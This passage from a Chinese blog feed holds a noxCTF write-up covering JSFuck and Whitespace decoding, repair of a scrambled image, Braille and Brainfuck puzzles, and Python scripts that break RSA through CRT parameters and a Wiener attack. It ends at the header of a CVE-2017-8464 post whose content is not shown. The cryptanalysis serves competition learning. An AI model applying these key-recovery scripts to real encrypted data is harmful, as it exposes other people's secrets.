!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])+[])+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()</span><br></pre></td></tr></table></figure></p><p>这不就是jsfuck吗，放到<a href="http://codertab.com/JsUnFuck跑一下，结果输出`nope`,事情远远没有想象的那么简单。经过仔细查看这些“空白”，发现不仅仅是空白，有很多空格，制表符之类的，Google查下，叫做Whitespace程序，[Whitespace](https://zh.wikipedia.org/wiki/Whitespace)是种深奥的编程语言。" target="_blank" rel="noopener">http://codertab.com/JsUnFuck跑一下，结果输出`nope`,事情远远没有想象的那么简单。经过仔细查看这些“空白”，发现不仅仅是空白，有很多空格，制表符之类的，Google查下，叫做Whitespace程序，[Whitespace](https://zh.wikipedia.org/wiki/Whitespace)是种深奥的编程语言。</a></p><p>这个<a href="https://vii5ard.github.io/whitespace/" target="_blank" rel="noopener">网站</a>可以在线解密,</p><p>最后flag：<code>noxCTF{DaFuckIsWHITESPACE}</code></p><h2 id="Blind-Date"><a href="#Blind-Date" class="headerlink" title="Blind Date"></a>Blind Date</h2><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">My mom got me a date with someone! she sent me an image but i cannot open it. I don&apos;t want it to be a blind date. Can you help me?</span><br></pre></td></tr></table></figure></p><p>这真的是个脑洞题！下载一个图片，又是打不开的文件，查看下格式</p><p><img src="https://i.loli.net/2018/09/09/5b951731eaa60.png" alt="打不开的图片.png"></p><p>跟正常文件比下</p><p><img src="https://i.loli.net/2018/09/09/5b9517a145efa.png" alt="正常.png"></p><p>确实不一样哦！写个脚本试试恢复看看<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">'BlindDate.jpeg'</span>, <span class="string">"rb"</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">f.close()</span><br><span class="line">data = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(s),<span class="number">4</span>):</span><br><span class="line">    data += s[i:i+<span class="number">4</span>][::<span class="number">-1</span>]</span><br><span class="line">file = open(<span class="string">'blind.jpeg'</span>,<span class="string">'wb'</span>)</span><br><span class="line">file.write(data)</span><br></pre></td></tr></table></figure></p><p>得到这样一个沙雕图片</p><p><img src="https://i.loli.net/2018/09/09/5b951872316e5.jpeg" alt="blind.jpeg"></p><p>按照套路，binwalk跑一下</p><p><img src="https://i.loli.net/2018/09/09/5b9518fb774d1.png" alt="3.png"></p><p>有个zip文件，分离下，得到压缩文件，可是。。要密码，这要我去哪里找密码啊？</p><p><img src="https://i.loli.net/2018/09/09/5b9519aa309bb.jpeg" alt=""></p><p>再次看看那个盲人图片，strings分析之后得到一些奇怪的东西<code>Li4gICAuICAuLiAgLi4gICAuICAuLiAgLi4gICAuICAuLiAgLiAgLi4NCi4gICAgLiAgIC4gICAgICAgLiAgICAgIC4gICAgLiAgIC4gIC4gIA0KICAgIC4uICAgICAgICAgIC4uICAgICAgLiAgIC4uICAgICAgLiAgLgPK</code></p><p><img src="https://i.loli.net/2018/09/09/5b951a1cafa23.png" alt=""></p><p>尝试base64解密之后有得到这些奇怪的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">..   .  ..  ..   .  ..  ..   .  ..  .  ..</span><br><span class="line">.    .   .       .      .    .   .  .  </span><br><span class="line">    ..          ..      .   ..      .  .</span><br></pre></td></tr></table></figure></p><p>摩尔斯？不像。那是啥？莫非是盲文！！<br>盲文解密之后为<code>F4C3P4LM</code>，试下解密zip，打开了！！高兴。又得到下面的东西。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++.+.+++++++++.&lt;---.+++++++++++++++++.--------------.&gt;+++.&lt;+++++++++++++++++.&lt;++++++++++++++++++.&gt;&gt;------.---------.--------.-----.++++++++++++++++++++++++++.&lt;&lt;.&gt;&gt;----.&lt;++++++++.+++.&gt;---------.&lt;&lt;+.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.&gt;-----.&lt;+.&gt;.+++.&gt;--------.&lt;&lt;---.&gt;&gt;++.&lt;++.-----.+++++.&lt;+++.&gt;&gt;++++++.&lt;&lt;-.++++++++++++.&gt;&gt;+++++++++.&lt;&lt;&lt;++++++++++++++++++++++.</span><br></pre></td></tr></table></figure><p>这个我知道是brainfuck，拿到<a href="https://sange.fi/esoteric/brainfuck/impl/interp/i.html" target="_blank" rel="noopener">网站</a>上面解密下.</p><p>flag:<code>noxCTF{W0uld_y0u_bl1nd_d4t3_4_bl1nd_d4t3?}</code></p><h2 id="Chop-Suey"><a href="#Chop-Suey" class="headerlink" title="Chop Suey"></a>Chop Suey</h2><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Today I ate in a Chinese restaurant and got myself a fortune cookie. These things usually contain a note with a nice sentence or phrase, but mine had numbers in it instead! Can you help me find the meaning of the numbers?</span><br><span class="line"></span><br><span class="line">p = 8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229 </span><br><span class="line"></span><br><span class="line">q = 12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469 </span><br><span class="line"></span><br><span class="line">dp = 6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929 </span><br><span class="line"></span><br><span class="line">dq = 783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041 </span><br><span class="line"></span><br><span class="line">c = 24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br></pre></td></tr></table></figure></p><p>这个考的是中国剩余定理,参考这篇文章，<a href="https://www.rootnetsec.com/picoctf-weird-rsa/" target="_blank" rel="noopener">https://www.rootnetsec.com/picoctf-weird-rsa/</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> crypto_commons.rsa.rsa_commons <span class="keyword">import</span> modinv, rsa_printable</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span></span><br><span class="line">q = <span class="number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span></span><br><span class="line"></span><br><span class="line">dp = <span class="number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span></span><br><span class="line">dq = <span class="number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span></span><br><span class="line"></span><br><span class="line">qinv = modinv(q, p)</span><br><span class="line">m1 = pow(c, dp, p)</span><br><span class="line">m2 = pow(c, dq, q)</span><br><span class="line">h = (qinv * (m1 - m2)) % p</span><br><span class="line">m = m2 + h * q</span><br><span class="line">str=hex(m)</span><br><span class="line">str=str[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join([chr(int(<span class="string">''</span>.join(c), <span class="number">16</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> zip(str[<span class="number">0</span>::<span class="number">2</span>],str[<span class="number">1</span>::<span class="number">2</span>])])</span><br></pre></td></tr></table></figure><p><a href="https://github.com/p4-team/crypto-commons" target="_blank" rel="noopener">https://github.com/p4-team/crypto-commons</a><br>下载这个库，<code>sudo python setup.py install</code>安装下。</p><p>flag:<code>noxCTF{W31c0m3_70_Ch1n470wn}</code></p><h2 id="WTF"><a href="#WTF" class="headerlink" title="WTF"></a>WTF</h2><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Um uhhhhhhhhh WTF IS THIS?! I give up. Now you try to solve this.</span><br><span class="line"></span><br><span class="line">N = lObAbAbSBlZOOEBllOEbblTlOAbOlTSBATZBbOSAEZTZEAlSOggTggbTlEgBOgSllEEOEZZOSSAOlBlAgBBBBbbOOSSTOTEOllbZgElgbZSZbbSTTOEBZZSBBEEBTgESEgAAAlAOAEbTZBZZlOZSOgBAOBgOAZEZbOBZbETEOSBZSSElSSZlbBSgbTBOTBSBBSOZOAEBEBZEZASbOgZBblbblTSbBTObAElTSTOlSTlATESEEbSTBOlBlZOlAOETAZAgTBTSAEbETZOlElBEESObbTOOlgAZbbOTBOBEgAOBAbZBObBTg</span><br><span class="line"></span><br><span class="line">e = lBlbSbTASTTSZTEASTTEBOOAEbEbOOOSBAgABTbZgSBAZAbBlBBEAZlBlEbSSSETAlSOlAgAOTbETAOTSZAZBSbOlOOZlZTETAOSSSlTZOElOOABSZBbZTSAZSlASTZlBBEbEbOEbSTAZAZgAgTlOTSEBEAlObEbbgZBlgOEBTBbbSZAZBBSSZBOTlTEAgBBSZETAbBgEBTATgOZBTllOOSSTlSSTOSSZSZAgSZATgbSOEOTgTTOAABSZEZBEAZBOOTTBSgSZTZbOTgZTTElSOATOAlbBZTBlOTgOSlETgTBOglgETbT</span><br><span class="line"></span><br><span class="line">c = SOSBOEbgOZTZBEgZAOSTTSObbbbTOObETTbBAlOSBbABggTOBSObZBbbggggZZlbBblgEABlATBESZgASBbOZbASbAAOZSSgbAOZlEgTAlgblBTbBSTAEBgEOEbgSZgSlgBlBSZOObSlgAOSbbOOgEbllAAZgBATgEAZbBEBOAAbZTggbOEZSSBOOBZZbAAlTBgBOglTSSESOTbbSlTAZATEOZbgbgOBZBBBBTBTOSBgEZlOBTBSbgbTlZBbbOBbTSbBASBTlglSEAEgTOSOblAbEgBAbOlbOETAEZblSlEllgTTbbgb</span><br></pre></td></tr></table></figure></p><p>看见<code>e</code>的这么大的值，它可能是Wiener攻击或变体，但是用一种不知道是什么的编码进行了加密，仔细看看这个<code>e</code>的值，我们发现他有一个特点:</p><p><code>[&#39;A&#39;, &#39;b&#39;, &#39;E&#39;, &#39;g&#39;, &#39;l&#39;, &#39;O&#39;, &#39;S&#39;, &#39;B&#39;, &#39;T&#39;, &#39;Z&#39;]</code></p><p>只有这十个字符组成，于是有了个大胆的想法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&apos;O&apos; --&gt; 0</span><br><span class="line">&apos;l&apos; --&gt; 1</span><br><span class="line">&apos;Z&apos; --&gt; 2</span><br><span class="line">&apos;E&apos; --&gt; 3</span><br><span class="line">&apos;A&apos; --&gt; 4</span><br><span class="line">&apos;S&apos; --&gt; 5</span><br><span class="line">&apos;b&apos; --&gt; 6</span><br><span class="line">&apos;T&apos; --&gt; 7</span><br><span class="line">&apos;B&apos; --&gt; 8</span><br><span class="line">&apos;g&apos; --&gt; 9</span><br></pre></td></tr></table></figure></p><p>将<code>e</code>解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">jiemi</span><span class="params">(str1)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"AbEglOSBTZ"</span>:</span><br><span class="line">            <span class="keyword">print</span> i</span><br><span class="line">    str1 = str1.replace(<span class="string">"O"</span>, <span class="string">'0'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"l"</span>, <span class="string">'1'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"Z"</span>, <span class="string">'2'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"E"</span>, <span class="string">'3'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"A"</span>, <span class="string">'4'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"S"</span>, <span class="string">'5'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"b"</span>, <span class="string">'6'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"T"</span>, <span class="string">'7'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"B"</span>, <span class="string">'8'</span>)</span><br><span class="line">    str1 = str1.replace(<span class="string">"g"</span>, <span class="string">'9'</span>)</span><br><span class="line">    <span class="keyword">return</span> str1</span><br></pre></td></tr></table></figure><p>得到<code>e=18165674577527345773800436360005849487629584246818834218136555374150149407637407524285601002127374055517203100485286275425145721883636036574242949710753834106366928190387866524288552807173498852374689387479028711005571557055252495247965030797704485232834280077859527260792773150470416827810790513797809193767</code></p><p>再利用<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">winner attack</a>攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="string">'lObAbAbSBlZOOEBllOEbblTlOAbOlTSBATZBbOSAEZTZEAlSOggTggbTlEgBOgSllEEOEZZOSSAOlBlAgBBBBbbOOSSTOTEOllbZgElgbZSZbbSTTOEBZZSBBEEBTgESEgAAAlAOAEbTZBZZlOZSOgBAOBgOAZEZbOBZbETEOSBZSSElSSZlbBSgbTBOTBSBBSOZOAEBEBZEZASbOgZBblbblTSbBTObAElTSTOlSTlATESEEbSTBOlBlZOlAOETAZAgTBTSAEbETZOlElBEESObbTOOlgAZbbOTBOBEgAOBAbZBObBTg'</span></span><br><span class="line"></span><br><span class="line">e = <span class="string">'lBlbSbTASTTSZTEASTTEBOOAEbEbOOOSBAgABTbZgSBAZAbBlBBEAZlBlEbSSSETAlSOlAgAOTbETAOTSZAZBSbOlOOZlZTETAOSSSlTZOElOOABSZBbZTSAZSlASTZlBBEbEbOEbSTAZAZgAgTlOTSEBEAlObEbbgZBlgOEBTBbbSZAZBBSSZBOTlTEAgBBSZETAbBgEBTATgOZBTllOOSSTlSSTOSSZSZAgSZATgbSOEOTgTTOAABSZEZBEAZBOOTTBSgSZTZbOTgZTTElSOATOAlbBZTBlOTgOSlETgTBOglgETbT'</span></span><br><span class="line"></span><br><span class="line">c = <span class="string">'SOSBOEbgOZTZBEgZAOSTTSObbbbTOObETTbBAlOSBbABggTOBSObZBbbggggZZlbBblgEABlATBESZgASBbOZbASbAAOZSSgbAOZlEgTAlgblBTbBSTAEBgEOEbgSZgSlgBlBSZOObSlgAOSbbOOgEbllAAZgBATgEAZbBEBOAAbZTggbOEZSSBOOBZZbAAlTBgBOglTSSESOTbbSlTAZATEOZbgbgOBZBBBBTBTOSBgEZlOBTBSbgbTlZBbbOBbTSbBASBTlglSEAEgTOSOblAbEgBAbOlbOETAEZblSlEllgTTbbgb'</span></span><br><span class="line"></span><br><span class="line">lookup = [<span class="string">'O'</span>, <span class="string">'l'</span>, <span class="string">'Z'</span>, <span class="string">'E'</span>, <span class="string">'A'</span>, <span class="string">'S'</span>, <span class="string">'b'</span>, <span class="string">'T'</span>, <span class="string">'B'</span>, <span class="string">'g'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(x)</span>:</span></span><br><span class="line">    ans = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> x:</span><br><span class="line">        ans += str(lookup.index(c))</span><br><span class="line">    <span class="keyword">return</span> int(ans)</span><br><span class="line"></span><br><span class="line">n = decode(n)</span><br><span class="line">e = decode(e)</span><br><span class="line">c = decode(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cf_expansion</span><span class="params">(n, d)</span>:</span></span><br><span class="line">    e = []</span><br><span class="line"></span><br><span class="line">    q = n // d</span><br><span class="line">    r = n % d</span><br><span class="line">    e.append(q)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> r != <span class="number">0</span>:</span><br><span class="line">        n, d = d, r</span><br><span class="line">        q = n // d</span><br><span class="line">        r = n % d</span><br><span class="line">        e.append(q)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents</span><span class="params">(e)</span>:</span></span><br><span class="line">    n = [] <span class="comment"># Nominators</span></span><br><span class="line">    d = [] <span class="comment"># Denominators</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(e)):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            ni = e[i]</span><br><span class="line">            di = <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">            ni = e[i]*e[i<span class="number">-1</span>] + <span class="number">1</span></span><br><span class="line">            di = e[i]</span><br><span class="line">        <span class="keyword">else</span>: <span class="comment"># i &gt; 1</span></span><br><span class="line">            ni = e[i]*n[i<span class="number">-1</span>] + n[i<span class="number">-2</span>]</span><br><span class="line">            di = e[i]*d[i<span class="number">-1</span>] + d[i<span class="number">-2</span>]</span><br><span class="line"></span><br><span class="line">        n.append(ni)</span><br><span class="line">        d.append(di)</span><br><span class="line">        <span class="keyword">yield</span> (ni, di)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(b, c)</span>:</span></span><br><span class="line">    k = b * b - <span class="number">4</span> * <span class="number">1</span> * c</span><br><span class="line">    <span class="keyword">if</span> k &lt; <span class="number">0</span>: <span class="keyword">return</span> []</span><br><span class="line">    sk, complete = gmpy2.iroot(k, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> complete: <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">return</span> [int((-b + sk) // <span class="number">2</span>), int((-b - sk) // <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wiener</span><span class="params">(e, n)</span>:</span></span><br><span class="line">    kd = convergents(cf_expansion(e, n))</span><br><span class="line">    <span class="keyword">for</span> i, (k, d) <span class="keyword">in</span> enumerate(kd):</span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>: <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        roots = solve(phi - n - <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> len(roots) == <span class="number">2</span>:</span><br><span class="line">            p, q = roots</span><br><span class="line">            <span class="keyword">if</span> p * q == n:</span><br><span class="line">                <span class="keyword">return</span> (p, q)</span><br><span class="line"></span><br><span class="line">p, q = wiener(e, n)</span><br><span class="line"></span><br><span class="line">r = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, r)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><p>flag:<code>noxCTF{RSA_1337_10rd}</code></p><p>首发于ichunqiu<br><a href="https://bbs.ichunqiu.com/thread-45809-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-45809-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Reference&quot;&gt;&lt;a href=&quot;#Reference&quot; class=&quot;headerlink&quot; title=&quot;Reference&quot;&gt;&lt;/a&gt;Reference&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;What is your refere
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-8464漏洞复现</title>
    <link href="https://threst.github.io/2018/09/11/CVE-2017-8464%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://threst.github.io/2018/09/11/CVE-2017-8464漏洞复现/</id>
    <published>2018-09-11T07:28:14.000Z</published>
    <updated>2018-09-11T07:28:55.696Z</updated>
    
